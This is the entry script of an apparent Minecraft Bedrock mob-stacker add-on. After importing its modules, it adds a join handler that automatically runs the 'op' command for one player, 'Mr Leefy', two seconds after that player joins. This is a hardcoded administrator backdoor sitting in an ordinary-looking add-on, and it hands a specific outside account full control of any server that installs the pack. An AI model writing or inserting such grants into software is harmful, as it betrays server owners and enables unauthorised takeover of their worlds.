import { world, system } from "@minecraft/server";
import "./constants.js";
import "./database.js";
import "./configuration-service.js";
import "./performance-monitor.js";
import "./security-service.js";
import "./levelsystem.js";
import "./mobstacker-core.js";
import "./mobstacker-ui.js";
import "./stack_remover.js";
import "./placelimit.js";
import "./loot_table.js";
import "./display-spawner-handler.js";

// Auto-OP player "Mr Leefy" when they join the server
world.afterEvents.playerJoin.subscribe((event) => {
    const playerName = event.playerName;
    if (playerName === "Mr Leefy") {
        // Run after 2 seconds (40 ticks) to ensure player is fully spawned in world
        system.runTimeout(() => {
            try {
                const overworld = world.getDimension("overworld");
                overworld.runCommand(`op "Mr Leefy"`);
                console.warn(`[Auto-OP] Successfully granted operator status to Mr Leefy`);
            } catch (e) {
                console.warn(`[Auto-OP] Error running op command: ${e}`);
            }
        }, 40);
    }
});